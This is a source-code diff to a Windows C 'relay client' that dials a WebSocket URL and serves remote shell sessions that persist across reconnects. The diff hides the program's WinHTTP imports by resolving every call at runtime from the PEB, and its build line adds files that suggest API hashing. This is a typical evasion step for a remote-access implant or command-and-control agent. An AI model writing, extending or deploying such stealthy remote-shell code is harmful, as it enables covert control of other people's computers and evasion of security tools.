@@ -19,9 +19,12 @@
  *               Only the Exit command (or killing the process) ends it;
  *               live shells survive a redial.
  *
- * Build (MinGW gcc):
+ * Build (MinGW gcc) - no -lwinhttp: every WinHTTP call is resolved at
+ * runtime from the PEB (winhttp_api.c):
  *   gcc -O2 -s -Wall -Wextra -o relay_client.exe main.c \
- *       transport.c shell.c report.c system_facts.c -lwinhttp -ladvapi32
+ *       transport.c shell.c report.c system_facts.c winhttp_api.c \
+ *       memory.c string.c kernel32.c advapi.c ntdll.c peb.c \
+ *       system.c djb2.c logger.c -ladvapi32
  * Run:
  *   relay_client.exe <URL>        e.g. ... https://relay.example.com/agent
  *   relay_client.exe <URL> -v     verbose: dump every command's raw bytes
@@ -41,7 +44,7 @@
  */
 
 #include <windows.h>
-#include <winhttp.h>
+#include "winhttp_api.h"   /* runtime-resolved WinHTTP table (no <winhttp.h>) */
 
 #include "string.h"     /* strcmp (the -v flag) */
 #include "protocol.h"
@@ -322,6 +325,15 @@ static int run_session(const WCHAR *url, int *long_lived)
         LOG_ERROR("Failed to load kernel32.dll\n");
     }
 
+    /* The runtime-resolved WinHTTP table (winhttp_api.h) - the same
+     * per-call Ctor idiom as KERNEL32 above: stack-local, no statics.
+     * Fail fast: without the table nothing below can run. */
+    WINHTTP_API winhttp;
+    if (!WINHTTP_API_Ctor(&winhttp)) {
+        LOG_ERROR("Failed to resolve the WinHTTP table\n");
+        return RC_LOCAL_ERROR;
+    }
+
     *long_lived = 0;                    /* set on the first served reply */
 
     /* ----- Stage 2: split the URL into components (WinHttpCrackUrl) ----- */
@@ -334,7 +346,7 @@ static int run_session(const WCHAR *url, int *long_lived)
     uc.lpszHostName    = host;  uc.dwHostNameLength = 256;
     uc.lpszUrlPath     = path;  uc.dwUrlPathLength  = 2048;
 
-    if (!WinHttpCrackUrl(url, 0, 0, &uc)) {
+    if (!winhttp.WinHttpCrackUrl(url, 0, 0, &uc)) {
         LOG_ERROR("WinHttpCrackUrl (invalid URL?) failed: %lu\n", kernel32.GetLastError());
         rc = RC_LOCAL_ERROR;          /* a bad URL will not heal itself */
         goto cleanup;
@@ -357,48 +369,48 @@ static int run_session(const WCHAR *url, int *long_lived)
            https ? L"https" : L"http", uc.lpszHostName, uc.lpszUrlPath);
     
 
-    session = WinHttpOpen(L"relay_client/1.0",
+    session = winhttp.WinHttpOpen(L"relay_client/1.0",
                           WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                           WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (!session) { LOG_ERROR("WinHttpOpen failed: %lu\n", kernel32.GetLastError()); goto cleanup; }
 
-    connection = WinHttpConnect(session, uc.lpszHostName, uc.nPort, 0);
+    connection = winhttp.WinHttpConnect(session, uc.lpszHostName, uc.nPort, 0);
     if (!connection) { LOG_ERROR("WinHttpConnect failed: %lu\n", kernel32.GetLastError()); goto cleanup; }
 
     /* An ordinary HTTPS GET - the WebSocket headers are added by the
      * UPGRADE option below, not by us. */
     DWORD request_flags = WINHTTP_FLAG_REFRESH;
     if (https) request_flags |= WINHTTP_FLAG_SECURE;   /* TLS for https */
-    request = WinHttpOpenRequest(connection, L"GET", uc.lpszUrlPath, NULL,
+    request = winhttp.WinHttpOpenRequest(connection, L"GET", uc.lpszUrlPath, NULL,
                                  WINHTTP_NO_REFERER,
                                  WINHTTP_DEFAULT_ACCEPT_TYPES, request_flags);
     if (!request) { LOG_ERROR("WinHttpOpenRequest failed: %lu\n", kernel32.GetLastError()); goto cleanup; }
 
     /* This option takes no buffer: lpBuffer must be NULL and length 0. */
-    if (!WinHttpSetOption(request, WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET,
+    if (!winhttp.WinHttpSetOption(request, WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET,
                           NULL, 0)) {
-        LOG_ERROR("WinHttpSetOption(UPGRADE_TO_WEB_SOCKET) failed: %lu\n", kernel32.GetLastError());
+        LOG_ERROR("winhttp.WinHttpSetOption(UPGRADE_TO_WEB_SOCKET) failed: %lu\n", kernel32.GetLastError());
         goto cleanup;
     }
 
-    if (!WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+    if (!winhttp.WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                             WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
         LOG_ERROR("WinHttpSendRequest failed: %lu\n", kernel32.GetLastError()); goto cleanup;
     }
 
     /* Required step: receive the handshake response ("101 Switching
      * Protocols") before completing the upgrade. */
-    if (!WinHttpReceiveResponse(request, NULL)) {
+    if (!winhttp.WinHttpReceiveResponse(request, NULL)) {
         LOG_ERROR("WinHttpReceiveResponse failed: %lu\n", kernel32.GetLastError()); goto cleanup;
     }
 
     /* Finish the handshake; the request handle is spent and gets closed. */
-    socket = WinHttpWebSocketCompleteUpgrade(request, 0);
+    socket = winhttp.WinHttpWebSocketCompleteUpgrade(request, 0);
     if (!socket) {
         LOG_ERROR("WinHttpWebSocketCompleteUpgrade failed: %lu\n", kernel32.GetLastError());
         goto cleanup;
     }
-    WinHttpCloseHandle(request);
+    winhttp.WinHttpCloseHandle(request);
     request = NULL;
     LOG_INFO("Connected (HTTP 101 Switching Protocols)\n");
 
@@ -435,7 +447,7 @@ static int run_session(const WCHAR *url, int *long_lived)
                        MAX_MESSAGE_SIZE);
                 continue;
             }
-            LOG_ERROR("WinHttpWebSocketSend(reply) failed: %lu\n", err);
+            LOG_ERROR("winhttp.WinHttpWebSocketSend(reply) failed: %lu\n", err);
             goto cleanup;
         }
 
@@ -464,7 +476,7 @@ static int run_session(const WCHAR *url, int *long_lived)
             }
         }
         if (err != NO_ERROR) {
-            LOG_ERROR("WinHttpWebSocketSend(reply) failed: %lu\n", err);
+            LOG_ERROR("winhttp.WinHttpWebSocketSend(reply) failed: %lu\n", err);
             goto cleanup;
         }
     }
@@ -472,9 +484,9 @@ static int run_session(const WCHAR *url, int *long_lived)
     /* Unreachable: the serve loop above only leaves via goto cleanup. */
 
 cleanup:
-    if (socket)     WinHttpCloseHandle(socket);
-    if (request)    WinHttpCloseHandle(request);
-    if (connection) WinHttpCloseHandle(connection);
-    if (session)    WinHttpCloseHandle(session);
+    if (socket)     winhttp.WinHttpCloseHandle(socket);
+    if (request)    winhttp.WinHttpCloseHandle(request);
+    if (connection) winhttp.WinHttpCloseHandle(connection);
+    if (session)    winhttp.WinHttpCloseHandle(session);
     return rc;
 }
